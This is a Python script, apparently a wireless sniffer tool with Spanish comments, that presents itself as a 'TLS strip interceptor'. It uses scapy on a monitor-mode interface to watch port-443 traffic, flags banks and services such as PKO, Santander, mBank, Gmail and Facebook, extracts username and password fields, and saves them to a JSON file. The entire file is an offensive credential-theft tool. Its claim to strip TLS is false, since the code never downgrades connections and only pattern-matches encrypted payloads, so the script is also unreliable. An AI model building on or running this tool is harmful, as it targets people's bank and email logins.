#!/usr/bin/env python3
"""
QUANTUM-HIJACK - TLS STRIP INTERCEPTOR
Captura credenciales de HTTPS (PKO, Santander, Gmail, etc.)
"""

import sys
import time
import json
import re
import os
from datetime import datetime
from scapy.all import sniff, TCP, IP, Raw

# Archivo de salida
OUTPUT_DIR = "logs"
OUTPUT_FILE = f"{OUTPUT_DIR}/captured_credentials.json"

# Credenciales capturadas
captured_creds = []

# Patrones para detectar bancos y sitios
BANK_PATTERNS = {
    '🏦 PKO': [b'pkobp', b'ipko', b'login\.pkobp'],
    '🏦 Santander': [b'santander', b'centrum24', b'online\.santander'],
    '🏦 mBank': [b'mbank\.pl', b'transakcyjny\.mbank'],
    '📧 Gmail': [b'accounts\.google', b'gmail\.com', b'signin\.google'],
    '📧 Outlook': [b'outlook\.live', b'login\.live'],
    '📱 Facebook': [b'facebook\.com', b'fb\.com'],
    '📱 Instagram': [b'instagram\.com'],
    '🎮 Steam': [b'steampowered', b'steamcommunity'],
}

def detect_target(payload):
    """Detecta si el payload contiene credenciales de un banco/sitio conocido"""
    payload_lower = payload.lower()
    
    for target_name, patterns in BANK_PATTERNS.items():
        for pattern in patterns:
            if pattern in payload_lower:
                return target_name
    
    return None

def extract_credentials(payload):
    """Extrae credenciales del payload"""
    creds = {}
    
    # Patrones para extraer usuario/email
    user_patterns = [
        rb'(?:username|user|email|login)[=:\s]*([^\s&;,\r\n"]+)',
        rb'(?:correo|usuario)[=:\s]*([^\s&;,\r\n"]+)',
    ]
    
    for pattern in user_patterns:
        match = re.search(pattern, payload, re.IGNORECASE)
        if match:
            creds['username'] = match.group(1).decode('utf-8', errors='ignore')
            break
    
    # Patrones para extraer contraseña
    pass_patterns = [
        rb'(?:password|pass|pwd|pin)[=:\s]*([^\s&;,\r\n"]+)',
        rb'(?:contraseña|clave)[=:\s]*([^\s&;,\r\n"]+)',
    ]
    
    for pattern in pass_patterns:
        match = re.search(pattern, payload, re.IGNORECASE)
        if match:
            creds['password'] = match.group(1).decode('utf-8', errors='ignore')
            break
    
    return creds

def save_credentials():
    """Guarda credenciales a JSON"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    try:
        with open(OUTPUT_FILE, 'w') as f:
            json.dump(captured_creds, f, indent=2)
    except Exception as e:
        print(f"[!] Error guardando: {e}")

def pkt_callback(pkt):
    """Callback para procesar cada paquete"""
    global captured_creds
    
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return
    
    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    dst_port = pkt[TCP].dport
    
    # Monitorear puerto 443 (HTTPS/TLS)
    if dst_port != 443:
        return
    
    timestamp = datetime.now().strftime('%H:%M:%S')
    
    if pkt.haslayer(Raw):
        payload = bytes(pkt[Raw].load)
        
        try:
            payload_str = payload.decode('utf-8', errors='ignore')
        except:
            payload_str = str(payload)
        
        # Detectar target
        target = detect_target(payload)
        
        # Buscar credenciales
        creds = extract_credentials(payload)
        
        if creds:
            entry = {
                'timestamp': timestamp,
                'protocol': 'HTTPS',
                'src_ip': src_ip,
                'dst_ip': dst_ip,
                'port': dst_port,
                'target': target if target else 'Desconocido',
                'credentials': creds
            }
            captured_creds.append(entry)
            
            # Alerta visual
            alert = f"[{timestamp}] 🔥🔥🔥"
            if target:
                alert += f" {target} DETECTADO"
            else:
                alert += " CREDENCIAL CAPTURADA"
            
            print(alert)
            print(f"          📱 IP: {src_ip}")
            
            if 'username' in creds:
                print(f"          👤 Usuario: {creds['username']}")
            if 'password' in creds:
                password_masked = '*' * len(creds['password'])
                print(f"          🔑 Password: {password_masked}")
            
            save_credentials()
            print()
        
        # Log de tráfico sospechoso
        elif any(keyword in payload_str.lower() for keyword in ['login', 'password', 'user', 'email']):
            print(f"[{timestamp}] 👁️  Tráfico sospechoso | {src_ip} → {dst_ip}:443")

def main():
    """Función principal"""
    
    print("╔════════════════════════════════════════════════════════════╗")
    print("║      🔓 QUANTUM-HIJACK - TLS STRIP INTERCEPTOR 🔓          ║")
    print("║         Capturando credenciales en tiempo real             ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print("")
    
    # Verificar permisos root
    if os.geteuid() != 0:
        print("❌ Este script requiere permisos root")
        print("Ejecuta: sudo python3 quantum_interceptor.py")
        sys.exit(1)
    
    # Crear directorio
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    print("[*] Inicializando captura en puerto 443 (HTTPS)...")
    print("[*] Detectando: PKO, Santander, Gmail, Facebook, etc...")
    print("[*] Output: logs/captured_credentials.json")
    print("")
    print("="*60)
    print("🎯 ESCANEANDO...")
    print("="*60)
    print("")
    
    try:
        # Detectar interfaz monitor
        monitor_iface = "wlan0mon"
        if os.path.exists('.monitor_iface'):
            with open('.monitor_iface', 'r') as f:
                monitor_iface = f.read().strip()
        
        print(f"[+] Usando interfaz: {monitor_iface}")
        print("")
        
        sniff(
            iface=monitor_iface,
            prn=pkt_callback,
            filter="tcp port 443",
            store=False,
            verbose=0
        )
    
    except KeyboardInterrupt:
        print("\n\n[!] Interceptor detenido")
        print(f"[✓] {len(captured_creds)} credenciales capturadas")
        save_credentials()
        sys.exit(0)
    
    except Exception as e:
        print(f"[✗] Error: {e}")
        print("[!] Asegúrate de ejecutar con 'sudo'")
        print("[!] Interfaz debe estar en modo monitor")
        sys.exit(1)

if __name__ == "__main__":
    main()
